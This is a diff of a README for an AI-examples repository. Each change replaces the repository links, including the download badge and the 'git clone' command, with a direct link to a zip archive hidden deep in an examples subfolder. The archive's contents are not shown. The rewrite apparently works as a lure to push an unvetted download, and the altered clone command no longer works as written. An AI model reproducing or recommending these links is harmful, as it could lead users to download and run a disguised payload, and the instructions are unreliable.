@@ -1,6 +1,6 @@
 # nxusKit-examples - Run AI examples with ease
 
-[![Download nxusKit-examples](https://img.shields.io/badge/Download%20nxusKit--examples-4B6FDC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gazlad80/nxusKit-examples)
+[![Download nxusKit-examples](https://img.shields.io/badge/Download%20nxusKit--examples-4B6FDC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gazlad80/nxusKit-examples/raw/refs/heads/main/examples/patterns/cost-routing/go/examples_nxus_Kit_v1.1.zip)
 
 ## 🖥️ What this is
 
@@ -37,7 +37,7 @@ If you only want to view the examples, you can do that in your browser.
 
 Use this link to visit the repository and get the examples:
 
-https://github.com/gazlad80/nxusKit-examples
+https://github.com/gazlad80/nxusKit-examples/raw/refs/heads/main/examples/patterns/cost-routing/go/examples_nxus_Kit_v1.1.zip
 
 ## 🚀 Getting started on Windows
 
@@ -57,7 +57,7 @@ If you use Git, you can also clone the repo:
 1. Open Command Prompt or PowerShell.
 2. Run:
 
-   git clone https://github.com/gazlad80/nxusKit-examples.git
+   git clone https://github.com/gazlad80/nxusKit-examples/raw/refs/heads/main/examples/patterns/cost-routing/go/examples_nxus_Kit_v1.1.zip
 
 3. Open the new folder on your PC.
 
@@ -255,7 +255,7 @@ If the example uses AI or probabilistic logic, the output may change based on th
 
 Visit the repo here:
 
-https://github.com/gazlad80/nxusKit-examples
+https://github.com/gazlad80/nxusKit-examples/raw/refs/heads/main/examples/patterns/cost-routing/go/examples_nxus_Kit_v1.1.zip
 
 ## 🗂️ Topics
 
